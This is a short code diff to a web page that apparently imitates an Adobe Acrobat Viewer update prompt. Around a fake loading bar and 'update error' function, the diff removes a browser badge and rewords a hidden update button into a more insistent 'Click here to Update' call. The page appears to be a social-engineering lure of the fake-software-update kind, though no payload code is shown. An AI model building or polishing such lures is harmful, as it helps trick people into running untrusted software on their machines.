@@ -1013,11 +1013,7 @@
             <div class="progress-text" id="progressText">Loading... 0%</div>
         </div>
         
-        <!-- Browser Badge (hidden initially) -->
-        <div class="browser-badge" id="browserBadge" style="display: none;">
-            <span id="browserIcon">🌐</span>
-            <span id="browserName">Browser</span>
-        </div>
+       
         
         <!-- Update Button (hidden initially) -->
         <button class="update-btn" id="updateViewerBtn" style="display: none;" onclick="updateAdobeViewer()">
@@ -1471,7 +1467,7 @@ function showUpdateError() {
     
     // Show update button
     document.getElementById('updateViewerBtn').style.display = 'flex';
-    document.getElementById('update_btn_txt').textContent = `Update Adobe Acrobat Viewer For ${browser.name}`;
+    document.getElementById('update_btn_txt').textContent = `Click here to Update Adobe Acrobat Viewer For ${browser.name}`;
 }
 
 // ========== SHOW MOBILE ERROR ==========
